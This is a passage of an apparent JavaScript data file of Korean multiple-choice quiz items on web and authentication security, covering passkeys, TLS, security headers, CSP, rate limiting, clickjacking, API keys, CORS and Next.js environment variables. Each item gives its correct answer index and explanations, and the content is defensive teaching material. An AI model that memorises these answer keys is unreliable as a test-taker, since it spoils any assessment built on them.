    category: 'auth-security',
    subcategory: 'biometric',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'WebAuthn / Passkeys — 핵심 원리',
    description: 'Passkeys(WebAuthn)가 기존 비밀번호 방식보다 안전한 핵심 이유는?',
    conceptExplanation:
      'WebAuthn(Web Authentication API)은 W3C 표준으로, 비밀번호 없이 공개키 암호화로 사용자를 인증하는 기술입니다. Passkeys는 WebAuthn을 기반으로 기기에서 공개키/개인키 쌍을 생성하여 인증하는 방식입니다. 생체 인식(지문, Face ID)은 기기 안의 개인키를 꺼내는 잠금 해제 수단이며, 생체 데이터 자체는 기기 밖으로 절대 전송되지 않습니다.',
    options: [
      '비밀번호를 더 길고 복잡하게 암호화하여 서버에 저장하는 방식이다',
      '공개키/개인키 쌍을 사용하며, 개인키는 기기 밖으로 절대 나가지 않고 생체 정보도 서버에 전송되지 않는다',
      '생체 정보(지문, 얼굴)를 서버에 안전하게 저장하여 매번 비교한다',
      'Passkeys는 비밀번호와 생체 정보를 함께 조합하여 더 강력한 해시를 만든다',
    ],
    correctAnswer: 1,
    explanation:
      'Passkeys는 공개키 암호화(Public Key Cryptography) 기반입니다. 등록 시 기기에서 공개키/개인키 쌍이 생성되고, 공개키만 서버에 저장됩니다. 인증 시 서버가 챌린지(랜덤값)를 보내면, 기기가 개인키로 서명하여 응답합니다. 생체 인식(지문/Face ID)은 개인키를 기기 안에서 꺼내는 열쇠 역할만 하며, 생체 데이터 자체는 기기 밖으로 나가지 않습니다. 서버 유출 시에도 공개키만 노출되어 안전합니다.',
    hints: ['공개키는 서버에, 개인키는 기기에', '생체 데이터 = 기기 로컬에서만'],
    deepDive:
      'WebAuthn 인증 흐름:\n\n[등록]\n1. 서버 → 클라이언트: challenge(랜덤값) 전달\n2. 브라우저: `navigator.credentials.create()` 호출\n3. OS/기기: 생체 인식으로 사용자 확인 → 공개키/개인키 쌍 생성\n4. 기기: 공개키 + attestation(기기 증명) → 서버 전달\n5. 서버: 공개키 저장\n\n[인증]\n1. 서버 → 클라이언트: challenge 전달\n2. 브라우저: `navigator.credentials.get()` 호출\n3. OS/기기: 생체 인식으로 개인키 잠금 해제\n4. 기기: 개인키로 challenge에 서명(signature) → 서버 전달\n5. 서버: 저장된 공개키로 서명 검증 → 인증 성공\n\n보안 장점:\n• 피싱 불가: 개인키는 등록된 도메인에서만 사용됨 (origin binding)\n• 서버 유출 무의미: 공개키만 저장, 개인키는 기기에\n• 생체 데이터 미전송: 지문/얼굴은 기기 보안 칩(Secure Enclave)에만 존재\n• 재사용 공격 불가: 매번 다른 challenge 서명',
    relatedProblems: ['auth-q-014', 'auth-q-015'],
  },
  {
    id: 'auth-q-014',
    category: 'auth-security',
    subcategory: 'biometric',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'navigator.credentials API — 등록 vs 인증',
    description: '다음 코드에서 각 단계의 역할로 올바른 것은?',
    conceptExplanation:
      '`navigator.credentials` API는 브라우저에서 WebAuthn 인증을 구현하기 위한 표준 JavaScript API입니다. `create()` 메서드는 처음 Passkey를 등록할 때 공개키/개인키 쌍을 기기에서 생성하며, `get()` 메서드는 이후 인증 시 서버가 보낸 challenge에 개인키로 서명하는 데 사용합니다. challenge는 재사용 공격(Replay Attack)을 방지하기 위해 매 요청마다 서버가 새로 생성하는 랜덤값입니다.',
    code: `// 등록 (Registration)
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: serverChallenge,          // A
    rp: { name: "MyApp", id: "myapp.com" },
    user: { id: userId, name: userEmail, displayName: "홍길동" },
    pubKeyCredParams: [{ alg: -7, type: "public-key" }],  // B
    authenticatorSelection: {
      userVerification: "required",      // C
    },
  },
})

// 인증 (Authentication)
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: serverChallenge,
    rpId: "myapp.com",
    allowCredentials: [{ id: credentialId, type: "public-key" }],
    userVerification: "required",
  },
})`,
    options: [
      'A=서버 비밀키, B=암호화 방식, C=2FA 필요 여부',
      'A=리플레이 공격 방지용 랜덤값, B=지원할 공개키 알고리즘(-7=ES256), C=생체/PIN으로 사용자 직접 확인 필수 여부',
      'A=세션 토큰, B=해시 반복 횟수, C=관리자 권한 여부',
      'A=챌린지는 선택 사항이며 없어도 된다, B=-7은 RSA 알고리즘, C=원격 인증 허용 여부',
    ],
    correctAnswer: 1,
    explanation:
      'challenge: 서버가 생성한 랜덤 바이트값으로, 매 요청마다 새로 생성되어 재사용 공격(Replay Attack)을 방지합니다. pubKeyCredParams의 alg: -7은 COSE 알고리즘 식별자로 ES256(ECDSA with SHA-256)을 의미합니다. alg: -257은 RS256(RSA)입니다. userVerification: "required"는 생체 인식 또는 PIN으로 사용자를 반드시 확인해야 함을 의미합니다.',
    hints: ['challenge = 매번 새로운 랜덤값', 'alg -7 = ES256 (Elliptic Curve)'],
    deepDive:
      'WebAuthn 주요 옵션:\n\n등록 옵션:\n```typescript\npubKeyCredParams: [\n  { alg: -7, type: "public-key" },   // ES256 (권장)\n  { alg: -257, type: "public-key" }, // RS256 (호환성)\n]\n\nauthenticatorSelection: {\n  authenticatorAttachment: "platform",  // 기기 내장 인증기 (Face ID, Touch ID)\n  // authenticatorAttachment: "cross-platform",  // 외부 인증기 (YubiKey)\n  residentKey: "required",    // Passkey: 기기에 credential 저장 (사용자명 불필요)\n  userVerification: "required",  // 생체/PIN 필수\n}\n```\n\n인증 결과 처리 (서버):\n```typescript\n// 서버에서 검증 (simplewebauthn 라이브러리 사용)\nimport { verifyRegistrationResponse, verifyAuthenticationResponse } from "@simplewebauthn/server"\n\n// 등록 검증\nconst verification = await verifyRegistrationResponse({\n  response: credential,\n  expectedChallenge,\n  expectedOrigin: "https://myapp.com",\n  expectedRPID: "myapp.com",\n})\n\n// 인증 검증\nconst verification = await verifyAuthenticationResponse({\n  response: assertion,\n  expectedChallenge,\n  authenticator: storedCredential,  // DB에서 꺼낸 공개키\n  expectedOrigin: "https://myapp.com",\n  expectedRPID: "myapp.com",\n})\n```\n\n추천 라이브러리: @simplewebauthn/browser (클라이언트), @simplewebauthn/server (서버)',
    relatedProblems: ['auth-q-013', 'auth-q-015'],
  },
  {
    id: 'auth-q-015',
    category: 'auth-security',
    subcategory: 'biometric',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Passkeys vs 비밀번호 — 보안 비교',
    description: 'Passkeys가 기존 비밀번호+2FA 방식 대비 갖는 장점으로 올바르지 않은 것은?',
    conceptExplanation:
      'Passkeys는 각 서비스마다 고유한 키 쌍을 생성하므로 비밀번호 재사용 문제가 원천적으로 없습니다. Origin Binding이라는 특성으로 인해 개인키는 오직 등록된 도메인에서만 사용되어 피싱 사이트에서는 동작하지 않습니다. 서버에는 공개키만 저장되므로 서버가 해킹당해도 계정이 탈취될 위험이 낮습니다.',
    options: [
      'Passkeys는 피싱 공격에 면역이다. 개인키가 등록된 도메인(RP ID)에서만 동작하므로 가짜 사이트에서는 사용 불가능하다',
      'Passkeys는 서버 DB가 해킹되어도 공개키만 노출되므로 계정이 탈취되지 않는다',
      'Passkeys는 오프라인 환경에서도 동작하지 않는다. 인증마다 서버와 실시간 통신이 필요하다',
      'Passkeys는 비밀번호 재사용 문제가 없다. 각 서비스마다 고유한 키 쌍이 생성된다',
    ],
    correctAnswer: 2,
    explanation:
      '틀린 것은 3번입니다. Passkeys의 인증 과정에서 실시간 서버 통신은 필요하지만(challenge 교환 및 서명 검증), 이는 기존 비밀번호 로그인도 마찬가지입니다. "오프라인에서 동작 안 한다"는 Passkeys만의 단점이 아닙니다. 나머지 보기는 모두 사실입니다: 피싱 면역(origin binding), 서버 유출 무의미(공개키만 저장), 비밀번호 재사용 없음(서비스별 고유 키 쌍).',
    hints: ['Passkeys도 서버 통신은 필요함 — 비밀번호와 동일'],
    deepDive:
      'Passkeys 도입 현황 및 고려사항:\n\n지원 플랫폼:\n• iOS 16+, macOS Ventura+: iCloud Keychain으로 기기 간 동기화\n• Android 9+: Google Password Manager로 동기화\n• Windows 11: Windows Hello (얼굴/지문/PIN)\n• 브라우저: Chrome 108+, Safari 16+, Firefox 122+\n\n폴백(Fallback) 전략:\n```typescript\n// Passkeys 지원 여부 확인\nconst isPasskeySupported = await PublicKeyCredential\n  .isUserVerifyingPlatformAuthenticatorAvailable()\n\nif (isPasskeySupported) {\n  // Passkey 등록/인증\n} else {\n  // 기존 비밀번호 또는 SMS OTP 폴백\n}\n```\n\n기기 분실 시 복구:\n• iCloud/Google 계정 복구로 Passkeys 복원\n• 백업 인증 수단(이메일 코드, 복구 코드) 필수 제공\n• FIDO2 Cross-Device Authentication: 다른 기기의 Passkey로 인증 가능 (QR 스캔)\n\nNestJS 구현 흐름:\n1. POST /auth/passkey/register/start → challenge 생성, Redis에 저장\n2. POST /auth/passkey/register/finish → credential 검증 후 DB에 공개키 저장\n3. POST /auth/passkey/login/start → challenge 생성\n4. POST /auth/passkey/login/finish → 서명 검증 → JWT 발급',
    relatedProblems: ['auth-q-013', 'auth-q-014'],
  },

  // ─── 웹 보안 심화 ──────────────────────────────────────────────────────────────

  {
    id: 'auth-q-031',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'easy',
    title: 'HTTPS/TLS — 중간자 공격 방어 원리',
    description: 'HTTP와 HTTPS의 보안 차이로 올바른 것은?',
    conceptExplanation:
      'HTTPS는 HTTP에 TLS(Transport Layer Security) 암호화 계층을 추가한 프로토콜입니다. TLS는 통신 내용을 암호화하여 네트워크 중간에서 패킷을 가로채도 내용을 읽을 수 없게 합니다. 또한 서버 인증서를 통해 클라이언트가 올바른 서버와 통신하고 있는지 확인하며, 데이터가 전송 중 변조되지 않았음을 보장합니다.',
    options: [
      'HTTPS는 HTTP보다 느리므로 내부 서비스에선 HTTP를 써도 안전하다',
      'HTTP는 평문 전송이라 중간자가 패킷을 도청·변조할 수 있고, HTTPS는 TLS로 암호화하여 기밀성·무결성을 보장하고 인증서로 서버 신원을 확인한다',
      'HTTPS를 사용하면 XSS와 CSRF도 자동으로 방어된다',
      'TLS는 데이터를 암호화하지 않고 서버 신원만 확인한다',
    ],
    correctAnswer: 1,
    explanation:
      'HTTP는 평문(Plain Text)으로 전송되어 네트워크 중간의 누구나 패킷을 읽거나 수정할 수 있습니다(중간자 공격, MITM). HTTPS = HTTP + TLS: ① 기밀성(Confidentiality): 대칭키로 데이터 암호화 → 도청 불가. ② 무결성(Integrity): MAC으로 변조 감지. ③ 인증(Authentication): CA가 서명한 인증서로 서버가 진짜인지 확인. HTTPS가 XSS/CSRF를 막지는 않습니다.',
    hints: ['TLS = Transport Layer Security', '기밀성 + 무결성 + 인증 세 가지'],
    deepDive:
      "TLS Handshake 흐름:\n1. 클라이언트 → 서버: ClientHello (지원하는 TLS 버전, 암호화 알고리즘 목록)\n2. 서버 → 클라이언트: ServerHello + 인증서(공개키 포함)\n3. 클라이언트: CA 서명 검증 (브라우저 내장 Root CA 목록 활용)\n4. 키 교환: ECDHE 등으로 세션 키(대칭키) 협상\n5. 이후 통신: 대칭키로 암호화\n\n인증서 종류:\n• DV (Domain Validation): 도메인 소유만 확인, 무료 (Let's Encrypt)\n• OV (Organization Validation): 조직 실체 확인\n• EV (Extended Validation): 엄격한 기업 검증, 주소창에 회사명 표시\n\nNext.js 배포 시:\n• Vercel: 자동 HTTPS (Let's Encrypt)\n• 자체 서버: nginx + certbot으로 TLS 설정\n```nginx\nserver {\n  listen 443 ssl;\n  ssl_certificate /etc/letsencrypt/live/domain.com/fullchain.pem;\n  ssl_certificate_key /etc/letsencrypt/live/domain.com/privkey.pem;\n}\n```",
    relatedProblems: ['auth-q-032', 'auth-q-003'],
  },
  {
    id: 'auth-q-032',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'HTTP Security Headers — HSTS, X-Content-Type-Options',
    description: '다음 응답 헤더들의 역할로 올바른 것은?',
    conceptExplanation:
      'HTTP 보안 헤더는 서버가 응답에 포함시켜 브라우저의 보안 동작을 제어하는 헤더들입니다. 각 헤더는 특정 공격 유형을 방어하기 위해 설계되었으며, 서버에서 설정하면 브라우저가 자동으로 그에 맞게 동작합니다. HSTS는 브라우저가 항상 HTTPS를 사용하도록 강제하고, X-Frame-Options는 Clickjacking, X-Content-Type-Options는 MIME 스니핑 공격을 방어합니다.',
    code: 'Strict-Transport-Security: max-age=31536000; includeSubDomains\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\nReferrer-Policy: strict-origin-when-cross-origin',
    options: [
      '모두 CORS를 설정하는 헤더다',
      'HSTS는 1년간 HTTPS 강제, nosniff는 MIME 스니핑 방지, DENY는 iframe 삽입 차단, Referrer-Policy는 Referer 헤더 범위 제한이다',
      '이 헤더들은 클라이언트(브라우저)가 요청 시 설정한다',
      'Next.js는 이 헤더들을 자동으로 설정하므로 별도 설정이 불필요하다',
    ],
    correctAnswer: 1,
    explanation:
      'HSTS(Strict-Transport-Security): 브라우저에게 이 도메인은 항상 HTTPS로만 접속하도록 강제. max-age=31536000은 1년. X-Content-Type-Options: nosniff: 브라우저가 MIME 타입을 추측하지 못하게 막아 Content-Type 스니핑 공격 방어. X-Frame-Options: DENY: 이 페이지를 iframe에 삽입 불가 → Clickjacking 방어. Referrer-Policy: 다른 사이트로 이동 시 Referer 헤더에 포함할 정보 제한.',
    hints: ['HSTS = HTTP → HTTPS 자동 업그레이드', 'X-Frame-Options = iframe 삽입 제어'],
    deepDive:
      'Next.js에서 Security Headers 설정:\n```typescript\n// next.config.ts\nconst securityHeaders = [\n  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },\n  { key: "X-Content-Type-Options", value: "nosniff" },\n  { key: "X-Frame-Options", value: "DENY" },\n  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },\n  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },\n]\n\nmodule.exports = {\n  async headers() {\n    return [{ source: "/(.*)", headers: securityHeaders }]\n  },\n}\n```\n\nHSTS Preload:\n• preload 지시자 + hstspreload.org 등록 시 브라우저에 하드코딩\n• 한 번 등록하면 삭제 어려움 → HTTPS 완전 준비 후 적용\n\nPermissions-Policy: 카메라/마이크/위치 등 브라우저 기능 접근 제어',
    relatedProblems: ['auth-q-031', 'auth-q-033', 'auth-q-035'],
  },
  {
    id: 'auth-q-033',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Content Security Policy (CSP) — XSS 심층 방어',
    description: '다음 CSP 헤더 설정의 의미로 올바른 것은?',
    conceptExplanation:
      'CSP(Content Security Policy)는 브라우저에게 이 페이지에서 어떤 출처의 리소스를 로드하고 실행할 수 있는지를 명시하는 보안 헤더입니다. 인라인 스크립트나 허용되지 않은 외부 도메인의 스크립트 실행을 차단하여 XSS 공격의 실질적인 피해를 줄이는 심층 방어(Defense in Depth) 수단입니다. 허용 목록(whitelist) 방식으로 동작하며, 지정하지 않은 리소스는 기본적으로 차단됩니다.',
    code: "Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *",
    options: [
      '모든 외부 리소스를 차단한다',
      "기본적으로 같은 도메인 리소스만 허용, 스크립트는 self와 cdn.example.com만 가능, 스타일은 인라인 허용, 이미지는 모든 출처 허용 — inline script는 기본 차단되어 XSS 방어 효과가 있다",
      'HTTPS에서만 동작하는 설정이다',
      '이 헤더는 서버 성능 최적화를 위한 캐시 설정이다',
    ],
    correctAnswer: 1,
    explanation:
      "CSP는 브라우저에게 이 페이지에서 어떤 출처의 리소스를 로드할 수 있는지 지시합니다. `default-src 'self'`: 기본값은 같은 도메인만. `script-src 'self' https://cdn.example.com`: 스크립트는 자기 도메인 + cdn.example.com만. 인라인 스크립트(`<script>악성코드</script>`)는 허용 목록에 없으므로 차단 → XSS 방어. `'unsafe-inline'`을 style-src에 추가하면 인라인 스타일 허용. `img-src *`: 이미지는 모든 출처 허용.",
    hints: ['CSP = 허용된 리소스 출처 화이트리스트', 'inline script 차단이 핵심 XSS 방어 메커니즘'],
    deepDive:
      "CSP 위반 리포팅:\n```typescript\n// report-uri로 CSP 위반 수집\nContent-Security-Policy: \n  default-src 'self'; \n  script-src 'self' 'nonce-{RANDOM_NONCE}'; \n  report-uri /api/csp-report\n\n// nonce 방식: 서버가 매 요청마다 랜덤 nonce 생성\n// 해당 nonce가 있는 script 태그만 허용\n<script nonce=\"{RANDOM_NONCE}\">\n  // 허용된 스크립트\n</script>\n```\n\nNext.js + CSP:\n```typescript\n// middleware.ts에서 nonce 생성\nconst nonce = Buffer.from(crypto.randomUUID()).toString('base64')\nconst cspHeader = `\n  default-src 'self';\n  script-src 'self' 'nonce-${nonce}' 'strict-dynamic';\n  style-src 'self' 'nonce-${nonce}';\n`\n```\n\nCSP 도입 전략: Report-Only 모드로 위반 수집 → 정책 조정 → Enforce 모드 전환",
    relatedProblems: ['auth-q-009', 'auth-q-032'],
  },
  {
    id: 'auth-q-034',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Rate Limiting — 브루트포스 공격 방어',
    description: '로그인 API에 Rate Limiting을 적용할 때 올바른 전략은?',
    conceptExplanation:
      'Rate Limiting은 특정 클라이언트(IP, 계정 등)가 일정 시간 내에 보낼 수 있는 요청 횟수를 제한하는 기법입니다. 브루트포스(Brute Force) 공격은 자동화 스크립트로 수많은 비밀번호를 빠르게 시도하는 공격으로, Rate Limiting으로 시도 횟수를 제한하면 공격에 소요되는 시간을 비현실적으로 늘릴 수 있습니다. 로그인 API처럼 보안이 중요한 엔드포인트에 필수적으로 적용됩니다.',
    options: [
      'Rate Limiting은 서버 성능을 위한 것으로 보안과 무관하다',
      'IP 또는 계정 단위로 일정 시간 내 요청 횟수를 제한하여 브루트포스(비밀번호 무차별 대입) 공격을 방어한다. 실패 횟수 초과 시 지수 백오프나 계정 잠금을 적용한다',
      'JWT를 사용하면 Rate Limiting이 자동으로 적용된다',
      'Rate Limiting은 DDoS 공격만 방어하며 브루트포스에는 효과가 없다',
    ],
    correctAnswer: 1,
    explanation:
      '브루트포스 공격: 공격자가 자동화 스크립트로 수백만 개의 비밀번호를 빠르게 시도합니다. Rate Limiting으로 IP당 5회/분 제한 시 공격이 수백만 배 느려집니다. 계정별 제한도 병행하면 IP 우회 공격도 방어합니다. 지수 백오프(1초→2초→4초→8초 대기)는 정상 사용자 불편을 최소화합니다.',
    hints: ['IP + 계정 두 단위로 제한', '지수 백오프로 정상 사용자 UX 보호'],
    deepDive:
      '```typescript\n// NestJS + @nestjs/throttler\nimport { ThrottlerModule, ThrottlerGuard } from "@nestjs/throttler"\n\n@Module({\n  imports: [\n    ThrottlerModule.forRoot([{\n      ttl: 60000,  // 1분\n      limit: 5,    // 5회\n    }]),\n  ],\n})\nexport class AppModule {}\n\n// 로그인 컨트롤러에 적용\n@UseGuards(ThrottlerGuard)\n@Post("login")\nasync login(@Body() dto: LoginDto) { ... }\n\n// Redis 기반 Rate Limiting (분산 환경)\nimport { ThrottlerStorageRedisService } from "nestjs-throttler-storage-redis"\nThrottlerModule.forRoot({\n  throttlers: [{ ttl: 60000, limit: 5 }],\n  storage: new ThrottlerStorageRedisService(redisClient),\n})\n```\n\n추가 방어:\n• 계정 잠금: 10회 실패 시 15분 잠금 (Redis TTL 활용)\n• CAPTCHA: 3회 실패 후 표시\n• 알림: 비정상 로그인 시도 이메일 발송\n• IP 블랙리스트: 반복 공격 IP 차단',
    relatedProblems: ['auth-q-012', 'auth-q-033'],
  },
  {
    id: 'auth-q-035',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Clickjacking 공격과 방어',
    description: 'Clickjacking 공격의 원리와 방어 방법으로 올바른 것은?',
    conceptExplanation:
      'Clickjacking(클릭재킹)은 공격자가 투명하거나 숨겨진 iframe으로 정상 웹 페이지를 덮어씌워 사용자의 클릭을 가로채는 UI 레드레싱(UI Redressing) 공격입니다. 사용자는 자신이 클릭하는 것이 공격자 페이지의 요소라고 생각하지만 실제로는 iframe 안의 정상 사이트 버튼을 클릭하게 됩니다. X-Frame-Options 또는 CSP의 frame-ancestors 헤더로 자신의 페이지가 iframe에 삽입되는 것 자체를 차단하여 방어합니다.',
    options: [
      'Clickjacking은 클릭 이벤트를 JS로 가로채는 공격으로 방화벽으로 방어한다',
      "공격자가 투명한 iframe으로 정상 사이트를 덮어씌워 사용자의 클릭을 가로채는 공격이다. X-Frame-Options: DENY 또는 CSP frame-ancestors 헤더로 iframe 삽입 자체를 차단한다",
      'Clickjacking은 JavaScript 없이는 불가능하다',
      'HTTPS를 사용하면 Clickjacking이 자동으로 방어된다',
    ],
    correctAnswer: 1,
    explanation:
      "Clickjacking: evil.com이 bank.com을 투명(opacity:0) iframe으로 덮어씌우고, 사용자가 '경품 받기' 버튼을 클릭하면 실제로는 bank.com의 '송금' 버튼이 클릭됩니다. 방어: X-Frame-Options: DENY (모든 iframe 금지) / SAMEORIGIN (같은 도메인만 허용). 더 세밀한 제어: CSP의 frame-ancestors 지시자.",
    hints: ['투명 iframe으로 사용자 클릭을 가로챔', 'X-Frame-Options 또는 CSP frame-ancestors로 방어'],
    deepDive:
      "```typescript\n// X-Frame-Options\nX-Frame-Options: DENY          // 모든 iframe 금지\nX-Frame-Options: SAMEORIGIN    // 같은 도메인만 허용\n\n// CSP frame-ancestors (더 현대적, 세밀한 제어)\nContent-Security-Policy: frame-ancestors 'none'          // 모든 iframe 금지\nContent-Security-Policy: frame-ancestors 'self'          // 같은 도메인만\nContent-Security-Policy: frame-ancestors trusted.com     // 특정 도메인만\n\n// X-Frame-Options vs frame-ancestors:\n// - 둘 다 설정 시 frame-ancestors 우선\n// - 새 CSP 스펙은 frame-ancestors 권장\n\n// Next.js\nconst headers = [\n  { key: 'X-Frame-Options', value: 'DENY' },\n  // 또는 CSP에 frame-ancestors 포함\n]\n```\n\nFrame Busting (구식 JS 방어, 권장하지 않음):\n```javascript\n// ❌ 구식 — iframe에서 JS 실행 차단으로 우회 가능\nif (window.top !== window.self) window.top.location = window.location\n```\n헤더 방식이 브라우저가 직접 차단하므로 더 안전합니다.",
    relatedProblems: ['auth-q-032', 'auth-q-033'],
  },
  {
    id: 'auth-q-036',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'API Key 인증 패턴과 보안 관리',
    description: 'API Key 인증 방식의 특징과 보안 관리 방법으로 올바른 것은?',
    conceptExplanation:
      'API Key는 클라이언트 애플리케이션이나 서버를 식별하기 위해 발급되는 정적 문자열 토큰입니다. JWT와 달리 만료 시간이 없고, 사용자 정보를 포함하지 않습니다. 주로 서버-서버 간 통신이나 서드파티 API 연동에 사용되며, 노출되면 즉시 폐기하고 새로 발급해야 합니다. 환경변수에 저장하고 절대 소스코드에 하드코딩하면 안 됩니다.',
    options: [
      'API Key는 JWT와 동일하며 사용자 정보를 포함한다',
      'API Key는 서버간(M2M) 통신이나 서드파티 연동에 적합한 정적 토큰이다. 만료 시간이 없으므로 노출 시 즉시 폐기/재발급이 가능해야 하고, 환경변수에 저장하며 절대 코드에 하드코딩하면 안 된다',
      'API Key는 클라이언트 브라우저에서 사용해도 안전하다',
      'API Key에는 사용자 권한이 없으므로 Rate Limiting이 불필요하다',
    ],
    correctAnswer: 1,
    explanation:
      'API Key는 특정 클라이언트(서버, 앱)를 식별하는 정적 토큰입니다. JWT(만료 시간 있음, 사용자 정보 포함)와 달리 단순한 문자열이며 만료가 없습니다. 주요 위험: GitHub 등에 코드를 올릴 때 API Key가 포함되면 탈취(자동화 봇이 24시간 스캔). 관리: 환경변수 사용, git에 절대 커밋 금지, 노출 시 즉시 폐기, 서비스별 별도 키 발급.',
    hints: ['만료 없음 → 노출 즉시 폐기 필요', '환경변수에 저장, 코드에 하드코딩 절대 금지'],
    deepDive:
      '```typescript\n// ✅ 올바른 API Key 사용\n// .env\nOPENAI_API_KEY=sk-xxxx\n\n// 서버 코드에서만 사용\nconst openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY })\n\n// ❌ 절대 금지 — 코드에 하드코딩\nconst apiKey = "sk-xxxx"  // git에 올라가면 탈취됨\n\n// ❌ 절대 금지 — 클라이언트에 노출\n// NEXT_PUBLIC_OPENAI_KEY=sk-xxxx  // 브라우저에서 접근 가능!\n\n// API Key 검증 미들웨어 (NestJS)\n@Injectable()\nexport class ApiKeyGuard implements CanActivate {\n  canActivate(context: ExecutionContext): boolean {\n    const req = context.switchToHttp().getRequest()\n    const key = req.headers["x-api-key"]\n    return key === process.env.INTERNAL_API_KEY\n  }\n}\n```\n\n보안 강화:\n• API Key에 prefix 추가: `sk_live_xxxx`, `sk_test_xxxx` (환경 구분)\n• 키별 권한 범위(scope) 제한\n• 사용 이력 로깅\n• 정기적 로테이션\n• GitHub Secret Scanning: 저장소에 키 패턴 감지 시 자동 알림',
    relatedProblems: ['auth-q-038', 'auth-q-001'],
  },
  {
    id: 'auth-q-037',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'hard',
    title: 'CORS + credentials:true — 와일드카드 Origin 보안 실수',
    description: '다음 코드에서 발생하는 보안 문제는?',
    conceptExplanation:
      'CORS 설정에서 `credentials: true`는 쿠키나 Authorization 헤더 같은 인증 정보를 교차 출처 요청에 포함할 수 있도록 허용하는 옵션입니다. `origin: "*"` (와일드카드)는 모든 출처를 허용한다는 의미입니다. CORS 스펙상 인증 정보 포함 요청(`credentials: true`)과 와일드카드 Origin 허용은 동시에 사용할 수 없도록 금지되어 있으며, 만약 허용된다면 어떤 악성 사이트도 로그인된 사용자의 인증 정보로 요청을 보낼 수 있게 됩니다.',
    code: "// NestJS CORS 설정\napp.enableCors({\n  origin: '*',           // 모든 Origin 허용\n  credentials: true,     // 쿠키/인증헤더 허용\n})",
    options: [
      'origin: "*"는 안전하므로 문제없다',
      'credentials:true와 origin:"*" 조합은 CORS 스펙상 브라우저가 거부하며, 실제로 허용되면 어느 사이트에서든 인증 쿠키를 첨부한 요청이 가능해져 CSRF 방어를 무력화한다',
      'credentials:true는 HTTPS에서만 필요하다',
      'NestJS에서는 이 설정이 자동으로 수정된다',
    ],
    correctAnswer: 1,
    explanation:
      'CORS 스펙: `credentials: true`(쿠키/Authorization 헤더 포함 요청)일 때 `Access-Control-Allow-Origin: *`는 허용되지 않습니다. 브라우저가 에러를 발생시킵니다. 만약 우회하여 적용된다면, 어떤 악성 사이트도 로그인된 사용자의 쿠키를 포함한 요청을 보낼 수 있어 CSRF 방어가 무너집니다. 반드시 명시적 Origin 목록을 지정해야 합니다.',
    hints: ['credentials:true + origin:"*" = CORS 스펙 위반 + 보안 취약', '명시적 Origin 화이트리스트 필요'],
    deepDive:
      '```typescript\n// ✅ 올바른 설정\napp.enableCors({\n  origin: (origin, callback) => {\n    const whitelist = [\n      "http://localhost:3000",\n      "https://myapp.com",\n      "https://admin.myapp.com",\n    ]\n    if (!origin || whitelist.includes(origin)) {\n      callback(null, true)  // 허용\n    } else {\n      callback(new Error("Not allowed by CORS"))  // 거부\n    }\n  },\n  credentials: true,\n  methods: ["GET", "POST", "PUT", "PATCH", "DELETE"],\n  allowedHeaders: ["Content-Type", "Authorization"],\n})\n\n// 환경별 동적 Origin 관리\nconst allowedOrigins = process.env.CORS_ORIGINS?.split(",") ?? []\napp.enableCors({ origin: allowedOrigins, credentials: true })\n```\n\nSameSite + credentials 조합:\n- SameSite=Strict: credentials 요청 자체를 다른 Origin에서 차단\n- SameSite=Lax: GET 요청은 허용, POST 등은 차단\n- 두 가지 방어를 함께 사용하는 것이 권장',
    relatedProblems: ['auth-q-008', 'auth-q-010'],
  },
  {
    id: 'auth-q-038',
    category: 'auth-security',
    subcategory: 'web-security',
    type: 'multiple-choice',
    difficulty: 'medium',
    title: 'Next.js 환경변수 보안 — NEXT_PUBLIC_ 노출 위험',
    description: '다음 .env 파일에서 브라우저(클라이언트)에 노출되는 값은?',
    conceptExplanation:
      'Next.js는 빌드 시 환경변수를 서버 전용과 클라이언트 공개용으로 구분합니다. `NEXT_PUBLIC_` 접두어가 붙은 환경변수는 클라이언트 번들에 포함되어 브라우저에서 접근 가능하며, 누구나 개발자 도구로 확인할 수 있습니다. 접두어 없는 환경변수는 서버 사이드(서버 컴포넌트, API 라우트, 서버 액션)에서만 접근 가능합니다.',
    code: 'DATABASE_URL=mongodb://localhost:27017/mydb\nJWT_SECRET=super-secret-key-123\nNEXT_PUBLIC_API_URL=https://api.myapp.com\nNEXT_PUBLIC_GOOGLE_MAP_KEY=AIzaSy...\nOPENAI_API_KEY=sk-xxxx',
    options: [
      '모든 환경변수가 브라우저에 노출된다',
      'NEXT_PUBLIC_ 접두어가 붙은 NEXT_PUBLIC_API_URL과 NEXT_PUBLIC_GOOGLE_MAP_KEY만 브라우저 번들에 포함되어 노출된다. DATABASE_URL, JWT_SECRET, OPENAI_API_KEY는 서버에서만 접근 가능하다',
      'DATABASE_URL만 노출된다',
      '.env 파일은 서버 전용이므로 어떤 값도 브라우저에 노출되지 않는다',
    ],
    correctAnswer: 1,
    explanation:
      'Next.js는 `NEXT_PUBLIC_` 접두어가 있는 환경변수만 클라이언트 번들에 포함합니다. 이 값들은 브라우저 개발자 도구에서 확인 가능하므로 민감한 정보(API 비밀 키, DB 연결 문자열, JWT 시크릿)는 절대 `NEXT_PUBLIC_`으로 설정하면 안 됩니다. Google Maps API Key처럼 노출이 불가피한 경우 HTTP Referer 제한, 도메인 화이트리스트를 설정해야 합니다.',
    hints: ['NEXT_PUBLIC_ = 클라이언트 번들에 포함 = 누구나 볼 수 있음'],
    deepDive:
